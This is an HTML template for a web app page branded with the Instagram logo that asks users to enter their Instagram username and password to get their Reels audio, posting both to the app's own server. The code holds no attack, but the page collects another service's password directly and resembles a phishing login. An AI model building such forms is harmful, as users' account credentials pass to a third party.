<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Instagram</title>
    <!-- The only change is adding "?v=1.1" to the end of this line -->
    <link rel="stylesheet" href="{{ url_for('static', filename='instagram_style.css') }}?v=1.1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="login-box-wrapper">
        <div class="login-box">
            <div class="logo">
                <i class="fab fa-instagram"></i>
            </div>
            <h2>Connect Your Instagram</h2>
            <p>Enter your credentials to get your Reels audio.</p>
        
            <form action="{{ url_for('connect_instagram') }}" method="POST">
                <div class="input-box">
                    <input type="text" name="username" required>
                    <label>Username or Phone Number</label>
                </div>
                <div class="input-box">
                    <input type="password" name="password" required>
                    <label>Password</label>
                </div>
                <button type="submit" class="btn">Connect</button>
            </form>
        </div>
    </div>
</body>
</html>
